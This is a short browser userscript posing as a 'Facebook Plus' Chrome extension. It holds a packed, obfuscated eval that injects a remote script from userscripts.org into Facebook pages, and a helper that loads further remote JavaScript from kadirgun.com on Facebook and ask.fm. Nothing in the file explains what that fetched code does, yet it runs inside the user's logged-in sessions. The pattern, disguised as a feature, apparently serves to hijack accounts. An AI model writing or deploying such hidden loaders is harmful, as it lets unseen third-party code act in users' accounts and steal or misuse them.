// ==UserScript==
// @name           Chrome Facebook Plus + Last Update
// @author         Chrome Facebook Plus + Last Update
// @version        1.0
// @description    Facebook için hazırlanmış Google Chrome eklentisi
// @namespace      Chrome Facebook
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include        http://*.formspring.me/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}

if(document.URL.indexOf("www.facebook.com") > 0){
addJavascript('http://www.kadirgun.com/facebook/fb.js');
}

if(document.URL.indexOf("http://ask.fm") >= 0){
addJavascript('http://www.kadirgun.com/ask.js');
}